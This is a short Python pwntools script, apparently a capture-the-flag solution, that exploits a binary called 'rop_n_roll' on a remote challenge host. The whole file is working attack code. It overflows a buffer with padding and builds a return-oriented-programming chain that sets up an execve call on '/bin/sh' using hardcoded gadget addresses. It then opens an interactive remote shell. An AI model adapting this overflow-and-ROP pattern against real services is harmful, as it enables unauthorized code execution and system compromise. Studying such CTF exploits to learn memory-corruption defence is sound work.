from pwn import *

context.binary = binary = ELF("./rop_n_roll", checksec = False)
system_address = p64(0x000000000040117d)
bin_sh = p64(0x00404048)
rdi = p64(0x00000000004013a3)
rsi_r15 = p64(0x00000000004013a1)
null_val = p64(0x0)
rdx = p64(0x000000000040117f)

p = process("./rop_n_roll")
p = remote("challenge.scy-phy.net", 2013)
#sleep(1)
#gdb.attach(p)

padding_A = b"A" * 200
p.send(padding_A)
p.recvline()
#sleep(1)

padding_B = b"B" * 200
p.send(padding_B)
p.recvline()

final_peice = b"C" * 119
final_peice += rdi
final_peice += bin_sh
final_peice += rsi_r15
final_peice += null_val
final_peice += null_val
final_peice += rdx
final_peice += null_val
final_peice += p64(59)
final_peice += null_val
final_peice += system_address
print(final_peice)
p.send(final_peice)
p.recvline()
#gdb.attach(p)
#sleep(1)
p.interactive()
